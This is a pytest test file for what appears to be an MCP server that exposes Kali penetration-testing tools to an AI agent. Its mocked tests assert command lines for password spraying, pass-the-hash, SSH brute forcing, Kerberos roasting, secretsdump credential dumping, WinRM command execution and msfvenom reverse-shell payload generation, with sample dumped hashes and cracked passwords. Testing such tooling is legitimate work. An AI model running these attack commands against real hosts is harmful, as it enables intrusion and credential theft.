async def test_ffuf_unknown_mode_returns_error_without_running():
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock()) as m:
        result = await ffuf.fuzz(target="https://example.com/FUZZ", mode="bogus", wordlist="/wl.txt")
    m.assert_not_called()
    assert result["exit_code"] == -1
    assert result["parsed"] == {"results": []}


@pytest.mark.asyncio
async def test_ffuf_no_wordlist_returns_error_with_parsed():
    with patch("kalimcp.tools.ffuf._default_wordlist", return_value=None), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock()):
        result = await ffuf.fuzz(target="https://example.com/FUZZ")
    assert result["exit_code"] == -1
    assert result["parsed"] == {"results": []}


@pytest.mark.asyncio
async def test_ffuf_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_FFUF_JSON_SAMPLE)
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock(return_value=fake)):
        result = await ffuf.fuzz(target="https://example.com/FUZZ", wordlist="/wl.txt")
    parsed = result["parsed"]
    assert len(parsed["results"]) == 2
    by_url = {r["url"]: r for r in parsed["results"]}
    admin = by_url["https://example.com/admin"]
    assert admin["status"] == 301
    assert admin["length"] == 234
    assert admin["redirect"] == "https://example.com/admin/"
    assert admin["content_type"] == "text/html"
    assert admin["input"] == {"FUZZ": "admin"}


@pytest.mark.asyncio
async def test_ffuf_parsed_field_empty_on_malformed_json():
    fake = _fake_result(stdout="not actually json")
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock(return_value=fake)):
        result = await ffuf.fuzz(target="https://example.com/FUZZ", wordlist="/wl.txt")
    assert result["parsed"] == {"results": []}


# ---------- whatweb ----------

_WHATWEB_JSON_SAMPLE = """{"target":"https://example.com/","http_status":200,"plugins":{"HTTPServer":[{"string":"Apache/2.4.41 (Ubuntu)"}],"WordPress":[{"version":"6.2.1"}],"X-Frame-Options":[{"string":"SAMEORIGIN"}],"Country":[{"string":"UNITED STATES","module":"US"}]}}"""


@pytest.mark.asyncio
async def test_whatweb_argv_shape():
    with patch("kalimcp.tools.whatweb.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await whatweb.fingerprint(target="https://example.com/")
    argv = m.call_args.args[0]
    assert argv[0] == "whatweb"
    assert "--log-json=-" in argv
    assert "--aggression=1" in argv
    assert argv[-1] == "https://example.com/"


@pytest.mark.asyncio
async def test_whatweb_aggression_clamped():
    with patch("kalimcp.tools.whatweb.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await whatweb.fingerprint(target="https://example.com/", aggression=99)
    argv = m.call_args.args[0]
    assert "--aggression=4" in argv


@pytest.mark.asyncio
async def test_whatweb_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_WHATWEB_JSON_SAMPLE)
    with patch("kalimcp.tools.whatweb.run.run", new=AsyncMock(return_value=fake)):
        result = await whatweb.fingerprint(target="https://example.com/")
    parsed = result["parsed"]
    assert parsed["target"] == "https://example.com/"
    assert parsed["http_status"] == 200
    assert parsed["server"] == "Apache/2.4.41 (Ubuntu)"
    assert parsed["detected_cms"] == "WordPress"
    plugin_names = [p["name"] for p in parsed["plugins"]]
    assert "HTTPServer" in plugin_names
    assert "WordPress" in plugin_names
    wp = next(p for p in parsed["plugins"] if p["name"] == "WordPress")
    assert wp["version"] == "6.2.1"


@pytest.mark.asyncio
async def test_whatweb_parsed_field_empty_on_malformed_json():
    fake = _fake_result(stdout="not json")
    with patch("kalimcp.tools.whatweb.run.run", new=AsyncMock(return_value=fake)):
        result = await whatweb.fingerprint(target="https://example.com/")
    assert result["parsed"] == {
        "target": "",
        "http_status": None,
        "server": "",
        "detected_cms": "",
        "plugins": [],
    }


# ---------- smb_enum ----------

_SMB_JSON_SAMPLE = """{
  "target": "192.168.1.10",
  "os_info": {
    "native_os": "Windows 10 Pro",
    "native_lan_manager": "Windows 10 Pro 6.3",
    "server_type": "Workstation, Server, Domain Member"
  },
  "smb_dialects": {
    "Signing enabled": false
  },
  "sessions": {
    "sessions_possible": true
  },
  "shares": {
    "ADMIN$": {"type": "Disk", "comment": "Remote Admin", "access": "DENIED"},
    "C$": {"type": "Disk", "comment": "Default share", "access": "DENIED"},
    "IPC$": {"type": "IPC", "comment": "Remote IPC", "access": "OK"},
    "share": {"type": "Disk", "comment": "Public", "access": "OK"}
  },
  "users": {
    "1000": {"username": "alice", "name": "Alice Anderson"},
    "1001": {"username": "bob", "name": "Bob Brown"}
  },
  "groups": {
    "513": {"groupname": "Domain Users"}
  },
  "domain_info": {
    "NetBIOS domain name": "CORP",
    "DNS domain": "corp.local"
  }
}"""


@pytest.mark.asyncio
async def test_smb_argv_shape(tmp_path):
    with patch("kalimcp.tools.smb.tempfile.NamedTemporaryFile") as mock_tmp, \
         patch("kalimcp.tools.smb.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        tmp_file = tmp_path / "out.json"
        tmp_file.write_text("")
        mock_tmp.return_value.name = str(tmp_file)
        mock_tmp.return_value.close = lambda: None
        await smb.enumerate(target="192.168.1.10")
    argv = m.call_args.args[0]
    assert argv[:2] == ["enum4linux-ng", "-A"]
    assert "-oJ" in argv
    assert argv[-1] == "192.168.1.10"


@pytest.mark.asyncio
async def test_smb_parsed_field_populated_on_success(tmp_path):
    json_file = tmp_path / "out.json"
    json_file.write_text(_SMB_JSON_SAMPLE)
    with patch("kalimcp.tools.smb.tempfile.NamedTemporaryFile") as mock_tmp, \
         patch("kalimcp.tools.smb.run.run", new=AsyncMock(return_value=_fake_result())):
        mock_tmp.return_value.name = str(json_file)
        mock_tmp.return_value.close = lambda: None
        result = await smb.enumerate(target="192.168.1.10")
    parsed = result["parsed"]
    assert parsed["target"] == "192.168.1.10"
    assert parsed["null_session"] is True
    assert parsed["signing"] == "false"
    assert parsed["os"]["native_os"] == "Windows 10 Pro"
    share_names = {s["name"] for s in parsed["shares"]}
    assert {"ADMIN$", "C$", "IPC$", "share"}.issubset(share_names)
    usernames = {u["username"] for u in parsed["users"] if "username" in u}
    assert usernames == {"alice", "bob"}
    assert parsed["domain"] == "CORP"


# ---------- snmp_enum ----------

_SNMP_OUTPUT_SAMPLE = """snmp-check v1.9 - SNMP enumerator

[+] Try to connect to 192.168.1.50:161 using SNMPv2c and community 'public'

[*] System information:

  Hostname: switch01.corp.local
  Description: Cisco IOS Software, C2960X Software
  Contact: noc@corp.local
  Location: Building 3, Rack A
  Uptime: 42 days, 11:22:33

[*] Processes:

  PID 1: init
  PID 2: kthreadd
  PID 100: snmpd

[*] Software components:

  bash 5.0
  openssl 1.1.1f
"""


@pytest.mark.asyncio
async def test_snmp_argv_shape():
    with patch("kalimcp.tools.snmp.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await snmp.enumerate(target="192.168.1.50")
    argv = m.call_args.args[0]
    assert argv[:5] == ["snmp-check", "-c", "public", "-v", "2c"]
    assert argv[-1] == "192.168.1.50"


@pytest.mark.asyncio
async def test_snmp_custom_community_argv():
    with patch("kalimcp.tools.snmp.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await snmp.enumerate(target="192.168.1.50", community="private")
    argv = m.call_args.args[0]
    assert argv[argv.index("-c") + 1] == "private"


@pytest.mark.asyncio
async def test_snmp_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_SNMP_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.snmp.run.run", new=AsyncMock(return_value=fake)):
        result = await snmp.enumerate(target="192.168.1.50", community="public")
    parsed = result["parsed"]
    assert parsed["target"] == "192.168.1.50"
    assert parsed["community"] == "public"
    assert parsed["hostname"] == "switch01.corp.local"
    assert parsed["contact"] == "noc@corp.local"
    assert parsed["location"] == "Building 3, Rack A"
    assert "42 days" in parsed["uptime"]
    assert any("init" in p for p in parsed["processes"])
    assert any("bash" in s for s in parsed["software"])


# ---------- ldap_enum ----------

_LDAP_OUTPUT_SAMPLE = """dn:
namingContexts: DC=corp,DC=local
namingContexts: CN=Configuration,DC=corp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
defaultNamingContext: DC=corp,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=corp,DC=local
configurationNamingContext: CN=Configuration,DC=corp,DC=local
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedLDAPVersion: 3
supportedLDAPVersion: 2
vendorName: Microsoft Corporation
domainFunctionality: 7
"""


@pytest.mark.asyncio
async def test_ldap_default_argv():
    with patch("kalimcp.tools.ldap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await ldap.enumerate(target="dc.corp.local")
    argv = m.call_args.args[0]
    assert argv[0] == "ldapsearch"
    assert "-x" in argv
    assert "-H" in argv and argv[argv.index("-H") + 1] == "ldap://dc.corp.local:389"
    assert "-s" in argv and argv[argv.index("-s") + 1] == "base"


@pytest.mark.asyncio
async def test_ldap_port_636_uses_ldaps_scheme():
    with patch("kalimcp.tools.ldap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await ldap.enumerate(target="dc.corp.local", port=636)
    argv = m.call_args.args[0]
    assert argv[argv.index("-H") + 1] == "ldaps://dc.corp.local:636"


@pytest.mark.asyncio
async def test_ldap_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_LDAP_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.ldap.run.run", new=AsyncMock(return_value=fake)):
        result = await ldap.enumerate(target="dc.corp.local")
    parsed = result["parsed"]
    assert parsed["host"] == "dc.corp.local"
    assert parsed["port"] == 389
    assert "DC=corp,DC=local" in parsed["naming_contexts"]
    assert parsed["default_naming_context"] == "DC=corp,DC=local"
    assert parsed["schema_dn"].startswith("CN=Schema")
    assert "1.2.840.113556.1.4.319" in parsed["supported_controls"]
    assert "GSSAPI" in parsed["supported_sasl_mechanisms"]
    assert "3" in parsed["supported_ldap_versions"]
    assert parsed["vendor"] == "Microsoft Corporation"


@pytest.mark.asyncio
async def test_ldap_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.ldap.run.run", new=AsyncMock(return_value=fake)):
        result = await ldap.enumerate(target="dc.corp.local")
    # host/port still populated from input even on empty output.
    parsed = result["parsed"]
    assert parsed["host"] == "dc.corp.local"
    assert parsed["port"] == 389
    assert parsed["naming_contexts"] == []


# ---------- netexec ----------

_NETEXEC_OUTPUT_SAMPLE = """SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:False) (SMBv1:False)
SMB         192.168.1.10    445    DC01             [+] CORP\\administrator:Password123 (Pwn3d!)
SMB         192.168.1.11    445    WS01             [-] CORP\\administrator:Password123 STATUS_LOGON_FAILURE
SMB         192.168.1.12    445    WS02             [+] CORP\\alice:hunter2
"""


@pytest.mark.asyncio
async def test_netexec_argv_shape_single_pair():
    with patch("kalimcp.tools.netexec.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await netexec.spray(
            target="192.168.1.0/24",
            protocol="smb",
            username="admin",
            password="hunter2",
        )
    argv = m.call_args.args[0]
    assert argv[:3] == ["netexec", "smb", "192.168.1.0/24"]
    assert "-u" in argv and argv[argv.index("-u") + 1] == "admin"
    assert "-p" in argv and argv[argv.index("-p") + 1] == "hunter2"


@pytest.mark.asyncio
async def test_netexec_argv_shape_pass_the_hash():
    with patch("kalimcp.tools.netexec.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await netexec.spray(
            target="192.168.1.10",
            protocol="winrm",
            username="admin",
            nthash="aad3b435b51404eeaad3b435b51404ee",
        )
    argv = m.call_args.args[0]
    assert argv[1] == "winrm"
    assert "-H" in argv
    assert "-p" not in argv  # nthash takes precedence over password


@pytest.mark.asyncio
async def test_netexec_unknown_protocol_returns_error():
    with patch("kalimcp.tools.netexec.run.run", new=AsyncMock()) as m:
        result = await netexec.spray(
            target="192.168.1.10",
            protocol="bogus",
            username="admin",
            password="x",
        )
    m.assert_not_called()
    assert result["exit_code"] == -1


@pytest.mark.asyncio
async def test_netexec_missing_creds_returns_error():
    with patch("kalimcp.tools.netexec.run.run", new=AsyncMock()) as m:
        result = await netexec.spray(target="192.168.1.10", protocol="smb")
    m.assert_not_called()
    assert result["exit_code"] == -1
    assert "username" in result["stderr"].lower() or "secret" in result["stderr"].lower()


@pytest.mark.asyncio
async def test_netexec_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_NETEXEC_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.netexec.run.run", new=AsyncMock(return_value=fake)):
        result = await netexec.spray(
            target="192.168.1.0/24",
            protocol="smb",
            username="administrator",
            password="Password123",
        )
    parsed = result["parsed"]
    assert parsed["protocol"] == "smb"
    assert len(parsed["successes"]) == 2
    by_host = {s["host"]: s for s in parsed["successes"]}
    dc = by_host["192.168.1.10"]
    assert dc["user"] == "administrator"
    assert dc["secret"] == "Password123"
    assert dc["domain"] == "CORP"
    assert dc["pwned"] is True
    assert by_host["192.168.1.12"]["pwned"] is False
    assert parsed["failures_count"] == 1


# ---------- medusa ----------

_MEDUSA_OUTPUT_SAMPLE = """Medusa v2.2 [http://www.foofus.net]
ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: alice (1 of 1, 0 complete) Password: hunter2 (1 of 1 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: alice Password: hunter2 [SUCCESS]
"""


@pytest.mark.asyncio
async def test_medusa_argv_shape():
    with patch("kalimcp.tools.medusa.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await medusa.crack(
            target="192.168.1.10",
            module="ssh",
            user_list="/tmp/users.txt",
            pass_list="/tmp/pass.txt",
        )
    argv = m.call_args.args[0]
    assert argv[0] == "medusa"
    assert argv[argv.index("-h") + 1] == "192.168.1.10"
    assert argv[argv.index("-U") + 1] == "/tmp/users.txt"
    assert argv[argv.index("-P") + 1] == "/tmp/pass.txt"
    assert argv[argv.index("-M") + 1] == "ssh"
    assert "-F" in argv


@pytest.mark.asyncio
async def test_medusa_threads_clamped():
    with patch("kalimcp.tools.medusa.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await medusa.crack(
            target="192.168.1.10",
            module="ssh",
            user_list="/u",
            pass_list="/p",
            threads=999,
        )
    argv = m.call_args.args[0]
    assert argv[argv.index("-t") + 1] == "32"


@pytest.mark.asyncio
async def test_medusa_missing_lists_returns_error():
    with patch("kalimcp.tools.medusa.run.run", new=AsyncMock()) as m:
        result = await medusa.crack(target="192.168.1.10", module="ssh")
    m.assert_not_called()
    assert result["exit_code"] == -1


@pytest.mark.asyncio
async def test_medusa_parsed_field_extracts_credentials():
    fake = _fake_result(stdout=_MEDUSA_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.medusa.run.run", new=AsyncMock(return_value=fake)):
        result = await medusa.crack(
            target="192.168.1.10",
            module="ssh",
            user_list="/u",
            pass_list="/p",
        )
    parsed = result["parsed"]
    assert parsed["success"] is True
    assert len(parsed["credentials_found"]) == 1
    cred = parsed["credentials_found"][0]
    assert cred["host"] == "192.168.1.10"
    assert cred["service"] == "ssh"
    assert cred["username"] == "alice"
    assert cred["password"] == "hunter2"
    assert parsed["hosts_tested"] == ["192.168.1.10"]
    assert parsed["services_tested"] == ["ssh"]


# ---------- john ----------

_JOHN_SHOW_SAMPLE = """alice:hunter2:1001:1001::/home/alice:/bin/bash
bob:s3cret:1002:1002::/home/bob:/bin/bash

2 password hashes cracked, 1 left
"""


@pytest.mark.asyncio
async def test_john_argv_shape():
    with patch("kalimcp.tools.john.run.run",
               new=AsyncMock(return_value=_fake_result(stdout=""))) as m:
        await john.crack(target="/loot/hashes.txt", wordlist="/wl.txt")
    # Two calls: crack pass, then show pass. We assert on the first.
    crack_call = m.call_args_list[0]
    crack_argv = crack_call.args[0]
    assert crack_argv == ["john", "--wordlist=/wl.txt", "/loot/hashes.txt"]
    show_call = m.call_args_list[1]
    show_argv = show_call.args[0]
    assert show_argv == ["john", "--show", "/loot/hashes.txt"]


@pytest.mark.asyncio
async def test_john_parsed_field_extracts_cracked():
    # First call returns empty, second call (show) returns the show sample.
    show_result = _fake_result(stdout=_JOHN_SHOW_SAMPLE)
    crack_result = _fake_result(stdout="")
    mock_run = AsyncMock(side_effect=[crack_result, show_result])
    with patch("kalimcp.tools.john.run.run", new=mock_run):
        result = await john.crack(target="/loot/hashes.txt")
    parsed = result["parsed"]
    cracked = parsed["cracked"]
    users = {c["user"]: c["password"] for c in cracked}
    assert users == {"alice": "hunter2", "bob": "s3cret"}
    assert parsed["total_hashes"] == 2
    assert parsed["remaining"] == 1


# ---------- hashcat ----------

_HASHCAT_SHOW_SAMPLE = """aad3b435b51404eeaad3b435b51404ee:hunter2
b4b9b02e6f09a9bd760f388b67351e2b:s3cret
"""


@pytest.mark.asyncio
async def test_hashcat_argv_shape():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.hashcat.run.run", new=AsyncMock(return_value=fake)) as m:
        await hashcat.crack(target="/loot/hashes.txt", mode=1000)
    crack_argv = m.call_args_list[0].args[0]
    assert crack_argv[0] == "hashcat"
    assert "-m=1000" in crack_argv
    assert "-a=0" in crack_argv
    assert "--quiet" in crack_argv
    # Last two args: hashfile then wordlist (hashcat's argument order).
    assert crack_argv[-2:] == ["/loot/hashes.txt", "/usr/share/wordlists/rockyou.txt"]
    show_argv = m.call_args_list[1].args[0]
    assert "--show" in show_argv
    assert "-m=1000" in show_argv


@pytest.mark.asyncio
async def test_hashcat_parsed_field_extracts_cracked():
    crack_result = _fake_result(stdout="")
    show_result = _fake_result(stdout=_HASHCAT_SHOW_SAMPLE)
    mock_run = AsyncMock(side_effect=[crack_result, show_result])
    with patch("kalimcp.tools.hashcat.run.run", new=mock_run):
        result = await hashcat.crack(target="/loot/hashes.txt", mode=1000)
    parsed = result["parsed"]
    assert parsed["mode"] == 1000
    cracked = parsed["cracked"]
    assert len(cracked) == 2
    by_pw = {c["password"] for c in cracked}
    assert by_pw == {"hunter2", "s3cret"}
    assert parsed["total_hashes"] == 2


# ---------- impacket suite ----------

_GETNPUSERS_SAMPLE = """Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$alice@CORP.LOCAL:e8ffa83d68f97c8d...c0:1234567890abcdef
$krb5asrep$23$bob@CORP.LOCAL:7c5d11ab09a32...:fedcba0987654321
"""

_GETUSERSPNS_SAMPLE = """Impacket v0.11.0

ServicePrincipalName        Name           MemberOf  PasswordLastSet      LastLogon  Delegation
--------------------------  -------------  --------  -------------------  ---------  ----------
MSSQLSvc/db.corp.local:1433 sql_service              2024-01-15 12:00     never

$krb5tgs$23$*sql_service$CORP.LOCAL$MSSQLSvc/db.corp.local~1433*$abc...$def...
"""

_SECRETSDUMP_SAMPLE = """Impacket v0.11.0

[*] Service RemoteRegistry is in stopped state
[*] Target system bootKey: 0xabcd1234
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Dumping cached domain logon information
[*] Kerberos keys grabbed
alice:aes256-cts-hmac-sha1-96:abc1234...
[*] Cleartext passwords stored in the LSA
"""


@pytest.mark.asyncio
async def test_impacket_getnpusers_argv():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await impacket.getnpusers(target="corp.local", dc_ip="10.0.0.1", user_list="/tmp/u.txt")
    argv = m.call_args.args[0]
    assert argv[0] == "impacket-GetNPUsers"
    assert "corp.local/" in argv
    assert "-format" in argv and argv[argv.index("-format") + 1] == "hashcat"
    assert "-usersfile" in argv and argv[argv.index("-usersfile") + 1] == "/tmp/u.txt"
    assert "-no-pass" in argv
    assert "-dc-ip" in argv and argv[argv.index("-dc-ip") + 1] == "10.0.0.1"


@pytest.mark.asyncio
async def test_impacket_getnpusers_parses_asrep_hashes():
    fake = _fake_result(stdout=_GETNPUSERS_SAMPLE)
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
        result = await impacket.getnpusers(target="corp.local", user_list="/u")
    parsed = result["parsed"]
    users = {u["user"] for u in parsed["users_no_preauth"]}
    assert users == {"alice", "bob"}


@pytest.mark.asyncio
async def test_impacket_getuserspns_argv_password():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await impacket.getuserspns(
            target="corp.local",
            username="alice",
            password="hunter2",
            dc_ip="10.0.0.1",
        )
    argv = m.call_args.args[0]
    assert argv[0] == "impacket-GetUserSPNs"
    assert "corp.local/alice:hunter2" in argv
    assert "-request" in argv


@pytest.mark.asyncio
async def test_impacket_getuserspns_argv_nthash_omits_password():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await impacket.getuserspns(
            target="corp.local",
            username="alice",
            nthash="aad3b435b51404eeaad3b435b51404ee",
        )
    argv = m.call_args.args[0]
    # username token has no embedded password.
    assert "corp.local/alice" in argv
    assert "-hashes" in argv


@pytest.mark.asyncio
async def test_impacket_getuserspns_parses_tgs_hash():
    fake = _fake_result(stdout=_GETUSERSPNS_SAMPLE)
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
        result = await impacket.getuserspns(
            target="corp.local",
            username="alice",
            password="x",
        )
    parsed = result["parsed"]
    assert len(parsed["spns"]) == 1
    spn = parsed["spns"][0]
    assert spn["user"] == "sql_service"
    assert "MSSQLSvc/db.corp.local" in spn["spn"]


@pytest.mark.asyncio
async def test_impacket_secretsdump_argv_with_password():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await impacket.secretsdump(
            target="dc.corp.local",
            username="admin",
            password="hunter2",
            just_dc=True,
        )
    argv = m.call_args.args[0]
    assert argv[0] == "impacket-secretsdump"
    assert "admin:hunter2@dc.corp.local" in argv
    assert "-just-dc" in argv


@pytest.mark.asyncio
async def test_impacket_secretsdump_missing_creds_returns_error():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock()) as m:
        result = await impacket.secretsdump(target="dc.corp.local", username="admin")
    m.assert_not_called()
    assert result["exit_code"] == -1


@pytest.mark.asyncio
async def test_impacket_secretsdump_parses_hash_lines():
    fake = _fake_result(stdout=_SECRETSDUMP_SAMPLE)
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
        result = await impacket.secretsdump(
            target="dc.corp.local",
            username="admin",
            password="hunter2",
        )
    parsed = result["parsed"]
    by_user = {s["principal"]: s for s in parsed["secrets"]}
    assert "Administrator" in by_user
    assert by_user["Administrator"]["rid"] == 500
    assert by_user["Administrator"]["nthash"] == "31d6cfe0d16ae931b73c59d7e0c089c0"
    assert by_user["alice"]["rid"] == 1000


@pytest.mark.asyncio
async def test_impacket_smbclient_pipes_command_via_stdin():
    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await impacket.smbclient(
            target="host", username="alice", password="x", command="shares",
        )
    argv = m.call_args.args[0]
    assert argv[0] == "impacket-smbclient"
    assert "alice:x@host" in argv
    # Command is delivered over stdin, not argv.
    stdin = m.call_args.kwargs.get("stdin")
    assert stdin is not None
    assert b"shares" in stdin
    assert b"exit" in stdin


# ---------- winrm_exec ----------


@pytest.mark.asyncio
async def test_winrm_exec_argv_uses_netexec_winrm_X():
    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await winrm.execute(
            target="10.0.0.5",
            username="alice",
            password="hunter2",
            command="whoami",
        )
    argv = m.call_args.args[0]
    assert argv[:3] == ["netexec", "winrm", "10.0.0.5"]
    assert "-u" in argv and argv[argv.index("-u") + 1] == "alice"
    assert "-p" in argv and argv[argv.index("-p") + 1] == "hunter2"
    assert "-X" in argv and argv[argv.index("-X") + 1] == "whoami"


@pytest.mark.asyncio
async def test_winrm_exec_missing_creds_returns_error():
    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock()) as m:
        result = await winrm.execute(
            target="10.0.0.5",
            username="alice",
            command="whoami",
        )
    m.assert_not_called()
    assert result["exit_code"] == -1


_WINRM_OUTPUT_SAMPLE = """WINRM       10.0.0.5        5985   WS01             [*] Windows 10 Pro
WINRM       10.0.0.5        5985   WS01             [+] alice:hunter2 (Pwn3d!)
nt authority\\system
WS01\\administrator
"""


@pytest.mark.asyncio
async def test_winrm_exec_parser_keeps_command_output_drops_banner():
    fake = _fake_result(stdout=_WINRM_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock(return_value=fake)):
        result = await winrm.execute(
            target="10.0.0.5",
            username="alice",
            password="hunter2",
            command="whoami",
        )
    parsed = result["parsed"]
    # Banner / pwn3d lines stripped; command output retained.
    assert parsed["output_lines"] == [
        "nt authority\\system",
        "WS01\\administrator",
    ]


# ---------- msfvenom ----------


@pytest.mark.asyncio
async def test_msfvenom_argv_shape(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with patch("kalimcp.tools.msfvenom.run.run",
               new=AsyncMock(return_value=_fake_result())) as m:
        await msfvenom.generate(
            target="win10-corp",
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            format="exe",
        )
    argv = m.call_args.args[0]
    assert argv[0] == "msfvenom"
    assert "-p" in argv and argv[argv.index("-p") + 1] == "windows/x64/meterpreter/reverse_tcp"
    assert "LHOST=10.0.0.1" in argv
    assert "LPORT=4444" in argv
    assert "-f" in argv and argv[argv.index("-f") + 1] == "exe"
    # No encoder passed → no -e in argv.
    assert "-e" not in argv


@pytest.mark.asyncio
async def test_msfvenom_encoder_flags(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with patch("kalimcp.tools.msfvenom.run.run",
               new=AsyncMock(return_value=_fake_result())) as m:
        await msfvenom.generate(
            target="win10-corp",
            payload="windows/shell_reverse_tcp",
            lhost="10.0.0.1",
            format="exe",
            encoder="x86/shikata_ga_nai",
            iterations=5,
            badchars="\\x00\\x0a",
        )
    argv = m.call_args.args[0]
    assert "-e" in argv and argv[argv.index("-e") + 1] == "x86/shikata_ga_nai"
    assert "-i" in argv and argv[argv.index("-i") + 1] == "5"
    assert "-b" in argv and argv[argv.index("-b") + 1] == "\\x00\\x0a"


@pytest.mark.asyncio
async def test_msfvenom_parsed_includes_path_and_sha256(tmp_path, monkeypatch):
    """Simulate msfvenom writing payload bytes to the configured -o path."""
    monkeypatch.setenv("HOME", str(tmp_path))

    payload_bytes = b"\x90" * 256 + b"shellcode"

    async def fake_run(argv, *, timeout=None, stdin=None):
        # Find the -o output path and write our fake payload to it.
        idx = argv.index("-o")
        out_path = argv[idx + 1]
        Path(out_path).write_bytes(payload_bytes)
        return {
            "argv": argv, "exit_code": 0, "elapsed_s": 0.01,
            "stdout": "", "stderr": "",
            "truncated": False, "timed_out": False,
        }

    with patch("kalimcp.tools.msfvenom.run.run", side_effect=fake_run):
        result = await msfvenom.generate(
            target="win10-corp",
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            format="exe",
        )
    assert "parsed" in result, f"result missing parsed; got: {result!r}"
    parsed = result["parsed"]
    assert parsed["size_bytes"] == len(payload_bytes)
    assert parsed["format"] == "exe"
    assert parsed["payload"] == "windows/x64/meterpreter/reverse_tcp"
    assert parsed["lhost"] == "10.0.0.1"
    assert parsed["lport"] == 4444
    # sha256 should be 64 hex chars and the path should end with that.
    assert len(parsed["sha256"]) == 64
    assert parsed["sha256"] in parsed["path"]
    assert parsed["path"].endswith(".exe")
    # Final file exists and matches sha256.
    final = Path(parsed["path"])
    assert final.exists()
